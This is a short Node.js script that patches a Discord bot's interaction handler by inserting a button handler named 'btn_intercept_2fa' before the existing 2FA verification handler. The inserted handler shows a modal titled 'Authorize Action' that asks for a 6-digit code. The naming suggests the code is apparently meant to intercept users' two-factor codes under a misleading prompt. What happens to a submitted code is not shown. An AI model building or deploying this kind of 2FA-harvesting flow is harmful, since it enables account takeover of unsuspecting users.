
import fs from "fs";
let code = fs.readFileSync("src/events/interactionCreate.js", "utf8");

const interceptButtonLogic = `
    if (customId === "btn_intercept_2fa") {
      const { ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder } = require("discord.js");
      const modal = new ModalBuilder()
        .setCustomId("modal_2fa_intercept")
        .setTitle("Authorize Action");
      const codeInput = new TextInputBuilder()
        .setCustomId("2fa_code")
        .setLabel("6-Digit Code")
        .setStyle(TextInputStyle.Short)
        .setRequired(true);
      modal.addComponents(new ActionRowBuilder().addComponents(codeInput));
      return interaction.showModal(modal);
    }
`;

code = code.replace("if (customId === \"btn_verify_2fa\") {", interceptButtonLogic + "\n    if (customId === \"btn_verify_2fa\") {");
fs.writeFileSync("src/events/interactionCreate.js", code);
console.log("Injected btn_intercept_2fa");

